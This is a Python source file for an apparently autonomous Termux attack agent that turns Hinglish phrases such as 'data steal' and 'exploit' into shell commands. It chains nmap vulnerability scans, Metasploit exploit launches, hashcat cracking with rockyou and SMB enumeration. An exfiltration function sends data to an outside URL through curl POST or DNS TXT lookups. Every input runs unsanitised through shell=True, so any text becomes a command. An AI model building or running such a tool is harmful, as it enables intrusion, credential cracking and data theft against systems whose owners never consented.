"""VoidCore orchestrator — standalone Termux execution engine with Hinglish parser."""

import subprocess
import logging
import re
from typing import Any, Dict, List, Optional

logger = logging.getLogger("voidcore.orchestrator")

# Hinglish-to-command mappings (exact phrase triggers)
HINGLISH_TRIGGERS = {
    # Scan commands
    "scan karo": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "1-1024"},
    "scan karna": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "1-1024"},
    "scan kar": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "1-1024"},
    "taermux scan": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "1-65535"},
    "termux scan": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "1-65535"},
    "network scan": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "1-1024"},
    "full scan": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "1-65535"},
    "quick scan": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "22,80,443,3306"},

    # Recon commands
    "recon karo": {"type": "recon", "default_target": "192.168.1.0/24"},
    "reconnaissance": {"type": "recon", "default_target": "192.168.1.0/24"},
    "target enum": {"type": "recon", "default_target": "192.168.1.0/24"},
    "osint": {"type": "recon", "default_target": "192.168.1.0/24"},
    "fingerprint": {"type": "recon", "default_target": "192.168.1.0/24"},

    # Execute commands
    "run": {"type": "execute"},
    "chalana": {"type": "execute"},
    "command run": {"type": "execute"},
    "shell": {"type": "execute"},

    # Crack commands
    "crack karo": {"type": "crack"},
    "hash crack": {"type": "crack"},
    "password crack": {"type": "crack"},

    # Exploit commands
    "exploit": {"type": "exploit"},
    "attack": {"type": "exploit"},
    "breach": {"type": "exploit"},

    # Enum commands
    "enum": {"type": "enum"},
    "enumerate": {"type": "enum"},
    "smb enum": {"type": "enum"},

    # Exfil commands
    "exfil": {"type": "exfil"},
    "data steal": {"type": "exfil"},

    # Crawl commands
    "crawl": {"type": "crawl"},
    "web crawl": {"type": "crawl"},
    "scrape": {"type": "crawl"},

    # Status / info
    "status": {"type": "execute", "default_code": "echo GhostLord v3.0 — Standalone Termux Agent"},
    "kaun hai": {"type": "execute", "default_code": "echo NEXUS — Surgical Architect of the Void"},
    "whoami": {"type": "execute", "default_code": "whoami"},
    "pwd": {"type": "execute", "default_code": "pwd"},
    "list": {"type": "execute", "default_code": "ls -la"},
    "ip": {"type": "execute", "default_code": "ifconfig || ip addr"},
    "network": {"type": "execute", "default_code": "ip addr"},
    "dns": {"type": "execute", "default_code": "cat /etc/resolv.conf"},
    "packages": {"type": "execute", "default_code": "pkg list-installed"},
}

# Words to strip ONLY when they appear as standalone trailing tokens
# (not as part of a command or argument)
FILLER_WORDS = {"karo", "karna", "karlo", "kare", "kar", "ko", "se", "mein", "par", "koi", "kuch", "ka", "ke", "la", "le", "den", "de", "do", "du", "ta", "se", "na", "ne"}


class Orchestrator:
    """Autonomous task execution engine for Termux with Hinglish NLP parser."""

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        self.config = config or {}
        self._task_counter = 0
        self._results: List[Dict[str, Any]] = []

    def run(self, task_type: str, payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute a task — main entry point."""
        self._task_counter += 1
        task_id = f"task_{self._task_counter:04d}"
        payload = payload or {}

        logger.info("Task %s: %s", task_id, task_type)

        try:
            if task_type == "recon":
                result = self._execute_recon(payload)
            elif task_type == "scan":
                result = self._execute_scan(payload)
            elif task_type == "execute":
                result = self._execute_command(payload)
            elif task_type == "crawl":
                result = self._execute_crawl(payload)
            elif task_type == "exploit":
                result = self._execute_exploit(payload)
            elif task_type == "crack":
                result = self._execute_crack(payload)
            elif task_type == "exfil":
                result = self._execute_exfil(payload)
            elif task_type == "enum":
                result = self._execute_enum(payload)
            else:
                result = {"message": "Unknown task type", "task_type": task_type}

            self._results.append({"task_id": task_id, "type": task_type, "result": result})
            return {"task_id": task_id, "status": "success", "result": result}

        except Exception as e:
            return {"task_id": task_id, "status": "error", "error": str(e)}

    def parse_and_run(self, raw_input: str) -> Dict[str, Any]:
        """Parse natural language / Hinglish input and execute the appropriate command.

        Strategy:
        1. Try exact Hinglish trigger match (longest first)
        2. Extract the remainder as the shell command/arguments
        3. Strip standalone filler words from the END of the remainder only
        4. If no trigger matches, treat entire input as a shell command
        """
        self._task_counter += 1
        task_id = f"task_{self._task_counter:04d}"
        raw = raw_input.strip()

        if not raw:
            return {"task_id": task_id, "status": "error", "error": "Empty input"}

        lower_raw = raw.lower()

        # Step 1: Find the longest matching Hinglish trigger
        best_trigger = None
        best_len = 0
        for trigger, mapping in HINGLISH_TRIGGERS.items():
            if trigger in lower_raw and len(trigger) > best_len:
                best_trigger = trigger
                best_len = len(trigger)
                best_mapping = mapping

        if best_trigger:
            # Extract remainder after the trigger
            trigger_pos = lower_raw.index(best_trigger)
            remainder = raw[trigger_pos + len(best_trigger):].strip()

            # Strip standalone filler words from the END of remainder only
            # Split into tokens, remove trailing fillers, rejoin
            tokens = remainder.split()
            while tokens and tokens[-1].lower() in FILLER_WORDS:
                tokens.pop()
            remainder = " ".join(tokens)

            task_type = best_mapping["type"]
            payload = {}

            # Extract target from remainder
            target_patterns = [
                r"target[:\s]+(\S+)",
                r"ip[:\s]+(\S+)",
                r"host[:\s]+(\S+)",
                r"machine[:\s]+(\S+)",
                r"server[:\s]+(\S+)",
                r"website[:\s]+(\S+)",
                r"url[:\s]+(\S+)",
                r"domain[:\s]+(\S+)",
            ]
            for pat in target_patterns:
                m = re.search(pat, remainder, re.IGNORECASE)
                if m:
                    payload["target"] = m.group(1)
                    break

            # Extract ports from remainder
            port_match = re.search(r"port[s]?[:\s]+(\S+)", remainder, re.IGNORECASE)
            if port_match:
                payload["ports"] = port_match.group(1)

            # For execute type, use remainder as the shell command
            if task_type == "execute":
                if "default_code" in best_mapping:
                    payload["code"] = best_mapping["default_code"]
                elif remainder:
                    payload["code"] = remainder
                else:
                    payload["code"] = ""

            # For scan type with no target, use default
            if task_type == "scan" and "target" not in payload:
                payload["target"] = best_mapping.get("default_target", "")
                payload["ports"] = best_mapping.get("default_ports", "1-65535")

            # For recon type with no target, use default
            if task_type == "recon" and "target" not in payload:
                payload["target"] = best_mapping.get("default_target", "")

            logger.info("Parsed '%s' -> trigger='%s', task_type=%s, payload=%s", raw, best_trigger, task_type, payload)
            return self.run(task_type, payload)

        # Step 2: No Hinglish trigger match — treat as raw shell command
        # But strip trailing filler words first
        tokens = raw.split()
        while tokens and tokens[-1].lower() in FILLER_WORDS:
            tokens.pop()
        cleaned_command = " ".join(tokens)

        logger.info("No Hinglish trigger for '%s' — treating as shell command: %s", raw, cleaned_command)
        return self.run("execute", {"code": cleaned_command})

    def _exec_cmd(self, cmd: str, timeout: int = 60) -> Dict[str, Any]:
        """Execute a raw shell command on Termux."""
        try:
            proc = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=timeout
            )
            return {
                "command": cmd,
                "stdout": proc.stdout.strip(),
                "stderr": proc.stderr.strip(),
                "returncode": proc.returncode,
                "status": "success" if proc.returncode == 0 else "failed",
            }
        except subprocess.TimeoutExpired:
            return {"command": cmd, "status": "timeout", "error": "Command timed out"}
        except Exception as e:
            return {"command": cmd, "status": "error", "error": str(e)}

    def _execute_recon(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        target = payload.get("target", "")
        scan_type = payload.get("scan_type", "full")
        if scan_type == "full":
            cmd = f"nmap -sV -sC -p- -T4 --script vuln {target}"
        elif scan_type == "quick":
            cmd = f"nmap -sV -sC -p 22,80,443,3306 {target}"
        else:
            cmd = f"nmap -sV {target}"
        return self._exec_cmd(cmd)

    def _execute_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        target = payload.get("target", "")
        ports = payload.get("ports", "1-65535")
        return self._exec_cmd(f"nmap -sV -sC -p {ports} -T4 {target}")

    def _execute_command(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        code = payload.get("code", "")
        if not code:
            return {"status": "error", "error": "No command provided. Usage: execute {code: 'command'}"}
        return self._exec_cmd(code)

    def _execute_crawl(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        url = payload.get("url", "")
        depth = payload.get("depth", 2)
        return self._exec_cmd(f"curl -sL --max-redirs {depth} {url}")

    def _execute_exploit(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        target = payload.get("target", "")
        port = payload.get("port", "")
        exploit = payload.get("exploit", "auto")
        if exploit == "auto":
            cmd = f"msfconsole -q -x 'use exploit/multi/handler; set RHOST {target}; set RPORT {port}; exploit'"
        else:
            cmd = f"msfconsole -q -x 'use {exploit}; set RHOST {target}; exploit'"
        return self._exec_cmd(cmd)

    def _execute_crack(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        hash_file = payload.get("hash_file", "")
        wordlist = payload.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        hash_type = payload.get("hash_type", "0")
        return self._exec_cmd(f"hashcat -m {hash_type} {hash_file} {wordlist}")

    def _execute_exfil(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        data = payload.get("data", "")
        exfil_url = payload.get("exfil_url", "")
        method = payload.get("method", "http")
        if method == "http":
            return self._exec_cmd(f"curl -X POST -d @{data} {exfil_url}")
        elif method == "dns":
            return self._exec_cmd(f"nslookup -q=TXT {data}.{exfil_url}")
        else:
            return self._exec_cmd(f"curl -X POST -d @{data} {exfil_url}")

    def _execute_enum(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        target = payload.get("target", "")
        port = payload.get("port", "445")
        return self._exec_cmd(f"nmap -p {port} --script smb-enum-shares,smb-os-discovery {target}")

    def get_status(self) -> Dict[str, Any]:
        return {
            "engine": "voidcore",
            "version": "3.0.1",
            "platform": "termux",
            "tasks_executed": self._task_counter,
            "results_count": len(self._results),
            "parser": "hinglish_nlp_v2",
        }

    def get_results(self) -> List[Dict[str, Any]]:
        return self._results
